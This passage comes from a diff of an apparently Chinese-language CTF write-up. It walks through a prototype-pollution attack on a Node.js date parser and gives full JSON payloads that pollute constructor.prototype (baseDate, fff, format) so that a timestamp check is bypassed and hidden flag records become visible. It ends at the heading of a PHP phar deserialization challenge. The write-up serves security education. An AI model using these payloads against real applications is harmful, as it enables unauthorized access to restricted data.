+</span></span><span class="line"><span class="cl">        <span class="nx">minTimestamp</span> <span class="o">=</span> <span class="nx">createDate</span><span class="p">(</span><span class="nx">CONFIG</span><span class="p">.</span><span class="nx">min_public_time</span><span class="p">).</span><span class="nx">getTime</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">Number</span><span class="p">.</span><span class="nb">isSafeInteger</span><span class="p">(</span><span class="nx">minTimestamp</span><span class="p">))</span> <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;Invalid configuration min_public_time.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="sb">`\x1b[33m</span><span class="si">${</span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="si">}</span><span class="sb">\x1b[0m`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="sb">`Try using default value </span><span class="si">${</span><span class="nx">DEFAULT_CONFIG</span><span class="p">.</span><span class="nx">min_public_time</span><span class="si">}</span><span class="sb">.`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">minTimestamp</span> <span class="o">=</span> <span class="nx">createDate</span><span class="p">(</span><span class="nx">DEFAULT_CONFIG</span><span class="p">.</span><span class="nx">min_public_time</span><span class="p">,</span> <span class="p">{</span> <span class="nx">UTC</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">baseDate</span><span class="o">:</span> <span class="nx">LauchTime</span> <span class="p">}).</span><span class="nx">getTime</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>触发<code>catch</code>的条件是前面<code>try</code>的<code>createDate</code>返回一个无效的日期，或者<code>createDate</code>本身被调用时发生错误</p>
+<p>**目标：**触发<code>createDate</code>错误，或使<code>createDate</code>返回无效日期</p>
+<p>下面的这行代码表明了基于<code>format</code>的日期匹配不可能返回一个无效日期，因此返回无效日期只有 Fallback Auto Detection 能够做到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">if (Number.isSafeInteger(d.getTime())) return d;
+</span></span><span class="line"><span class="cl">else continue;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从如下代码片段可知，基于<code>format</code>的日期匹配依赖于<code>baseDate</code>，format 的过程是在<code>argTable</code>上进行覆盖</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">dateObj</span> <span class="o">=</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">baseDate</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">_UTC</span> <span class="o">=</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">UTC</span> <span class="o">?</span> <span class="s2">&#34;UTC&#34;</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">argTable</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;yyyy&#34;</span><span class="o">:</span> <span class="nx">dateObj</span><span class="p">[</span><span class="sb">`get</span><span class="si">${</span><span class="nx">_UTC</span><span class="si">}</span><span class="sb">FullYear`</span><span class="p">](),</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;MM&#34;</span><span class="o">:</span> <span class="nx">dateObj</span><span class="p">[</span><span class="sb">`get</span><span class="si">${</span><span class="nx">_UTC</span><span class="si">}</span><span class="sb">Month`</span><span class="p">]()</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;dd&#34;</span><span class="o">:</span> <span class="nx">dateObj</span><span class="p">[</span><span class="sb">`get</span><span class="si">${</span><span class="nx">_UTC</span><span class="si">}</span><span class="sb">Date`</span><span class="p">](),</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;HH&#34;</span><span class="o">:</span> <span class="nx">dateObj</span><span class="p">[</span><span class="sb">`get</span><span class="si">${</span><span class="nx">_UTC</span><span class="si">}</span><span class="sb">Hours`</span><span class="p">](),</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;mm&#34;</span><span class="o">:</span> <span class="nx">dateObj</span><span class="p">[</span><span class="sb">`get</span><span class="si">${</span><span class="nx">_UTC</span><span class="si">}</span><span class="sb">Minutes`</span><span class="p">](),</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ss&#34;</span><span class="o">:</span> <span class="nx">dateObj</span><span class="p">[</span><span class="sb">`get</span><span class="si">${</span><span class="nx">_UTC</span><span class="si">}</span><span class="sb">Seconds`</span><span class="p">](),</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;fff&#34;</span><span class="o">:</span> <span class="nx">dateObj</span><span class="p">[</span><span class="sb">`get</span><span class="si">${</span><span class="nx">_UTC</span><span class="si">}</span><span class="sb">Milliseconds`</span><span class="p">]</span> <span class="o">?</span> <span class="nx">dateObj</span><span class="p">[</span><span class="sb">`get</span><span class="si">${</span><span class="nx">_UTC</span><span class="si">}</span><span class="sb">Milliseconds`</span><span class="p">]()</span> <span class="o">:</span> <span class="kc">undefined</span> <span class="c1">// due to system architecture
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">sortTable</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">f</span><span class="p">,</span> <span class="nx">i</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">f</span> <span class="o">==</span> <span class="s2">&#34;yy&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">year</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">regres</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">year</span> <span class="o">=</span> <span class="nx">year</span> <span class="o">&lt;</span> <span class="mi">100</span> <span class="o">?</span> <span class="p">(</span><span class="mi">1900</span> <span class="o">+</span> <span class="nx">year</span><span class="p">)</span> <span class="o">:</span> <span class="nx">year</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">argTable</span><span class="p">[</span><span class="s2">&#34;yyyy&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">year</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">argTable</span><span class="p">[</span><span class="nx">f</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">regres</span><span class="p">[</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因此污染<code>baseDate</code>为无效日期即可绕过 format 模式进入 Fallback Auto Detection</p>
+<p><code>routes/info.js</code>的<code>try</code>中用的是<code>config.js</code>中的<code>min_pulic_time</code>，为<code>2019-07-09 00:00:00</code>，不带有毫秒，刚好能够触发<code>fff</code>的原型链污染，为<code>fff</code>指定为无效值即可</p>
+<p>到此为止，使用如下的 payload 可以触发<code>catch</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;contact&#34;</span><span class="p">:</span><span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;reason&#34;</span><span class="p">:</span><span class="s2">&#34;2&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;constructor&#34;</span><span class="p">:{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;prototype&#34;</span><span class="p">:{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;baseDate&#34;</span><span class="p">:</span><span class="s2">&#34;aaa&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;fff&#34;</span><span class="p">:</span> <span class="s2">&#34;bbb&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进入<code>catch</code>后，达到了污染<code>format</code>的条件，但是<code>createDate</code>的参数变成了<code>config.default.js</code>中的<code>min_public_time</code>，为<code>2019-07-08T16:00:00.000Z</code>，因此可以构造<code>format</code>为<code>yy19-MM-ddTHH:mm:ss.fffZ</code></p>
+<p>然后基于<code>format</code>的日期匹配会返回<code>1920-07-08T16:00:00.000Z</code>的日期，已经将<code>minTimestamp</code>提早了近一个世纪了</p>
+<p>因此最终的<code>payload</code>为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;contact&#34;</span><span class="p">:</span><span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="s2">&#34;reason&#34;</span><span class="p">:</span><span class="s2">&#34;a&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;constructor&#34;</span><span class="p">:{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;prototype&#34;</span><span class="p">:{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;format&#34;</span><span class="p">:</span> <span class="s2">&#34;yy19-MM-ddTHH:mm:ss.fffZ&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;baseDate&#34;</span><span class="p">:</span><span class="s2">&#34;aaa&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;fff&#34;</span><span class="p">:</span> <span class="s2">&#34;bbb&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>以<code>Content-Type: application/json</code>的 Header 用<code>POST</code>方法向路径<code>/submit</code>请求即可</p>
+<p>然后我们再请求<code>/info/0</code>，找到含有 flag 的一条数据</p>
+<p><img src="/p/2023-newstar-web/image-20250526152536641.png"
+	width="1832"
+	height="334"
+	srcset="/p/2023-newstar-web/image-20250526152536641_hu_e248b2247b13a986.png 480w, /p/2023-newstar-web/image-20250526152536641_hu_38514c5a741f290f.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250526152536641"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="548"
+		data-flex-basis="1316px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="err">#</span><span class="nx">完整过程</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">当</span> <span class="nx">createDate</span><span class="p">(</span><span class="nx">CONFIG</span><span class="p">.</span><span class="nx">min_public_time</span><span class="p">)</span> <span class="nx">被调用时</span><span class="err">，</span><span class="nx">由于</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">baseDate</span> <span class="nx">被污染为</span> <span class="s2">&#34;aaa&#34;</span><span class="err">，</span><span class="nx">createDate</span> <span class="nx">在基于</span> <span class="nx">format</span> <span class="nx">的日期匹配时会使用无效的</span> <span class="nx">baseDate</span><span class="err">，</span><span class="nx">从而进入</span> <span class="nx">Fallback</span> <span class="nx">Auto</span> <span class="nx">Detection</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">在</span> <span class="nx">Fallback</span> <span class="nx">Auto</span> <span class="nx">Detection</span> <span class="nx">中</span><span class="err">，</span><span class="nx">getHMS</span> <span class="nx">函数处理</span> <span class="s2">&#34;2019-07-09 00:00:00&#34;</span> <span class="nx">时</span><span class="err">，</span><span class="nx">返回的对象不包含</span> <span class="nx">fff</span> <span class="nx">属性</span><span class="err">，</span><span class="nx">因此会从原型链上查找</span> <span class="nx">fff</span><span class="err">，</span><span class="nx">从而使用我们注入的</span> <span class="s2">&#34;bbb&#34;</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">由于</span> <span class="s2">&#34;bbb&#34;</span> <span class="nx">不是有效的毫秒数值</span><span class="err">，</span><span class="nx">createDate</span> <span class="nx">在</span> <span class="nx">Fallback</span> <span class="nx">Auto</span> <span class="nx">Detection</span> <span class="nx">模式下无法成功解析日期</span><span class="err">，</span><span class="nx">最终使得</span> <span class="nx">createDate</span><span class="p">(</span><span class="nx">CONFIG</span><span class="p">.</span><span class="nx">min_public_time</span><span class="p">).</span><span class="nx">getTime</span><span class="p">()</span> <span class="nx">返回</span> <span class="kc">NaN</span><span class="err">，</span><span class="nx">从而触发</span> <span class="k">catch</span> <span class="nx">块</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">在</span> <span class="k">catch</span> <span class="nx">块中污染</span> <span class="nx">format</span>
+</span></span><span class="line"><span class="cl"><span class="nx">进入</span> <span class="k">catch</span> <span class="nx">块后</span><span class="err">，</span><span class="nx">程序会执行</span> <span class="nx">minTimestamp</span> <span class="o">=</span> <span class="nx">createDate</span><span class="p">(</span><span class="nx">DEFAULT_CONFIG</span><span class="p">.</span><span class="nx">min_public_time</span><span class="p">,</span> <span class="p">{</span> <span class="nx">UTC</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">baseDate</span><span class="o">:</span> <span class="nx">LauchTime</span> <span class="p">}).</span><span class="nx">getTime</span><span class="p">();</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">这次调用</span> <span class="nx">createDate</span> <span class="nx">传入了</span> <span class="p">{</span> <span class="nx">UTC</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">baseDate</span><span class="o">:</span> <span class="nx">LauchTime</span> <span class="p">}</span> <span class="nx">作为</span> <span class="nx">opts</span><span class="err">。</span><span class="nx">虽然</span> <span class="nx">opts</span> <span class="nx">本身是固定的</span><span class="err">，</span><span class="nx">但它的原型链</span><span class="err">（</span><span class="nx">最终指向</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="err">）</span><span class="nx">已经被我们污染</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">由于</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">format</span> <span class="nx">被污染为</span> <span class="s2">&#34;yy19-MM-ddTHH:mm:ss.fffZ&#34;</span><span class="err">，</span><span class="nx">createDate</span> <span class="nx">在处理</span> <span class="nx">DEFAULT_CONFIG</span><span class="p">.</span><span class="nx">min_public_time</span><span class="err">（</span><span class="s2">&#34;2019-07-08T16:00:00.000Z&#34;</span><span class="err">）</span><span class="nx">时</span><span class="err">，</span><span class="nx">会使用错误的格式解析日期</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">具体来说</span><span class="err">，</span><span class="s2">&#34;yy19-MM-ddTHH:mm:ss.fffZ&#34;</span> <span class="nx">会将</span> <span class="s2">&#34;2019-07-08T16:00:00.000Z&#34;</span> <span class="nx">中的年份</span> <span class="s2">&#34;20&#34;</span> <span class="nx">解析为</span> <span class="nx">yy</span><span class="err">，</span><span class="nx">然后拼接上</span> <span class="s2">&#34;19&#34;</span> <span class="nx">形成</span> <span class="s2">&#34;2019&#34;</span><span class="err">，</span><span class="nx">但实际解析时</span> <span class="nx">yy</span> <span class="nx">会匹配</span> <span class="s2">&#34;20&#34;</span><span class="err">，</span><span class="mi">19</span> <span class="nx">会匹配</span> <span class="s2">&#34;19&#34;</span><span class="err">，</span><span class="nx">导致年份被错误解析为</span> <span class="mi">1919</span><span class="err">（</span><span class="nx">或类似的早于</span> <span class="mi">2019</span> <span class="nx">的年份</span><span class="err">）。</span>
+</span></span><span class="line"><span class="cl"><span class="nx">通过这种方式</span><span class="err">，</span><span class="nx">minTimestamp</span> <span class="nx">的年份被提前了近一个世纪</span><span class="err">，</span><span class="nx">从而绕过了时间戳限制</span><span class="err">。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="week5">week5
 </h1><h2 id="unserialize-again">Unserialize Again
 </h2><h3 id="考点绕过wake_upcve-2016-7124结合phar反序列化考phar签名算法">考点：绕过wake_up(CVE-2016-7124)结合phar反序列化（考phar签名算法）
 </h3><p>看注释提示抓包又看到提示</p>
